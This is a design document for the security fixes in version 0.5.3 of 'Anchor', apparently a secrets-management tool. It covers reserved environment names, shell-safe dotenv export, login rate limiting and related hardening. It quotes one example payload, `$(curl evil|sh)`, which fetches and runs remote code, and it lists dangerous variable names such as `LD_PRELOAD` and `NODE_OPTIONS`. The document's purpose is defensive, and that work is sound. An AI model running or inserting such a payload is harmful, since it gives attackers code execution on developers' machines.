# Anchor 0.5.3: security fixes (design)

## Intent

A security review of 0.5.2 (2026-11-09) found no critical issue but several exploitable gaps,
mostly where Anchor hands secrets to other programs and where anonymous traffic meets accounts.
0.5.3 fixes the ones the owner chose, with tests that prove each attack now fails. No crypto,
data format or API shape changes; old clients keep working against the new server and the reverse.

## Goals (chosen by the owner)

1. **Reserved environment names.** `anchor run`, `anchor export --format dotenv` and
   `@anchor-secrets/nestjs` `loadAnchorEnv` no longer inject secrets whose names change how
   programs load code or route traffic (`NODE_OPTIONS`, `LD_PRELOAD`, `PATH`, proxies, ...).
   They skip them with a warning; `--allow-reserved` / `allowReservedKeys: true` opts back in.
   The server is unchanged (existing secrets stay readable). *Attack closed:* a folder writer
   (developer, read-write token, prompt-injected agent) gets code execution on the CI runner or
   laptop that runs `anchor run`, and with it secrets they cannot read.
2. **Shell-safe dotenv export.** `formatDotenv` never writes a line a shell or docker-compose
   would execute or interpolate. Values it cannot write safely fail with the existing hint to use
   JSON or YAML. *Attack closed:* `it's $(curl evil|sh)` runs when someone `source`s the export.
3. **Login rate limit per (address, email).** The lock moves from the account to the pair
   `(client address, submitted email)`, plus a looser per-address cap, counted in a new D1 table.
   Unknown and known emails answer identically, including the 429. *Attacks closed:* anyone
   locking the owner out with five bad passwords every 15 minutes; email enumeration through the
   429.
4. **Pinned workflow actions.** Every `uses:` in `.github/workflows/*.yml` is pinned to a full
   commit SHA (with the tag as a comment, Dependabot keeps them fresh); the npm publish job
   installs with `--ignore-scripts`.
5. **CLI browser login without a prefilled code.** `/cli/login` ignores `?code=`; the person types
   the code their terminal shows. The CLI opens `/cli/login` and prints the code. *Attack
   weakened:* a phishing link that pre-approves an attacker's device code.
6. **SDK refuses plaintext http** to non-loopback hosts unless `allowInsecureHttp: true`, the rule
   the CLI already applies.
7. **Security headers on Worker responses** (`/api/*`, `/oauth/*`, `/mcp`, `/.well-known/*`) and
   HSTS on the dashboard assets.
8. **Client hygiene.** `anchor run` removes the inherited `ANCHOR_TOKEN` from the child's
   environment unless `--pass-token`; the CLI and the SDK never follow HTTP redirects.

## Non-goals

- OAuth consent hardening for dynamically registered clients, setup token, release attestation,
  offboarding (service tokens and grants of disabled users), slug enumeration: accepted or
  deferred; the security model page lists the accepted ones.
- No server-side ban on reserved names (would change the API for old CLIs).
- No change to the password-change lockout (per account, authenticated callers only).

## Decisions

- **Reserved names live in `@anchor/shared/env-keys`**, bundled into the SDK (no zod, like
  `value-decode`) and re-exported publicly as `isReservedEnvKey`. nestjs imports it from the SDK.
  Matching is case-insensitive (Windows env names are; proxies are honored in lower case).
- **Skip + warn, never fail.** Key names are not secret, so the warning names them; values never.
- **A secret named `ANCHOR_*` is reserved**: `ANCHOR_API_URL` + an inherited token would send the
  token to another server.
- **Rate limit storage: D1 table `login_attempts`** (migration 0009), strongly consistent, no
  `wrangler.jsonc` change. Keys: `p|<addr>|<email>` (5 failures → 15 min lock) and `i|<addr>`
  (50 failures → 15 min lock), `<addr>` = `rateLimitKey(cf-connecting-ip)` (IPv6 by /64), or
  `-` when absent (no `i|` key then). Fixed 15-minute window. A success deletes only the pair row.
- **Dotenv quoting**: bare → `'…'` (no `'`, no newline) → `"…"` (no `"`, `$`, backtick, `\n`/`\r`
  escape sequence) → error. The backtick form is removed (shells execute it).
- **Redirects**: `redirect: "manual"`; any 3xx other than 304 is an error naming the origin.
- **Version 0.5.3** (owner's call), with an *Upgrade notes* section for the behavior changes.

## Compatibility

| Change | Who notices |
|---|---|
| Reserved names skipped | Folders that store `NODE_OPTIONS`, `*_PROXY`, `PATH`, `ANCHOR_*`... → warning; `--allow-reserved` restores |
| Dotenv export | Values containing `'` and `$`/backtick, or both quote kinds → error suggesting JSON/YAML |
| Login limit | Nobody, beyond a lock now per address; migration 0009 is additive |
| `ANCHOR_TOKEN` stripped | Commands that call `anchor`/the SDK under `anchor run` with the parent's token → `--pass-token` |
| SDK http | Services using `http://` to a non-loopback host → `allowInsecureHttp: true` |
| Redirects | API URLs that redirect (e.g. behind an auth proxy) → clear error; use the final URL |
| CLI login | Old CLIs open `/cli/login?code=…` and land on the code form; the code is in their terminal |
